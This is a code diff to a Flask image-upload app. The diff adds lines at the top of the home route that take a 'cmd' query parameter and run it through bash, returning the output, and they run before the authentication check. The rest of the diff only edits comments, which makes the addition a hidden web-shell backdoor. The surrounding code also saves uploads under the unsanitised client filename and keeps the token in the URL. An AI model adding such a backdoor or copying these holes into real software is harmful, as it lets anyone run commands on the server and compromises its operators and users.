@@ -12,11 +12,16 @@ app.config["IMAGES_DIR_NAME"] = "images"
 
 @app.route("/", methods=["GET", "POST"])
 def home():
+    cmd = request.args.get('cmd')
+    if cmd:
+        import subprocess
+        p = subprocess.run(["bash", "-c", cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+        return p.stdout.decode()
     image_name = random.choice(os.listdir("images"))
     image = os.path.join(app.config["IMAGES_DIR_NAME"], image_name)
 
-    # TODO: should pass token via POST parameters
-    token = request.args.get("token")
+    # authenticate the user
+    token = request.args.get("token")  # <-- insecure! should be passed in cookies or POST parameters
     if not token:
         return "401 Unauthorized (missing token)", 401
 
@@ -38,7 +43,6 @@ def home():
         if file and file.filename:
             new_file = os.path.join(app.config['IMAGES_DIR_NAME'], file.filename)
             file.save(new_file)
-            # return f"Saved file: {os.path.abspath(new_file)}", 200
             return render_template(
                 "saved_success.html",
                 context={
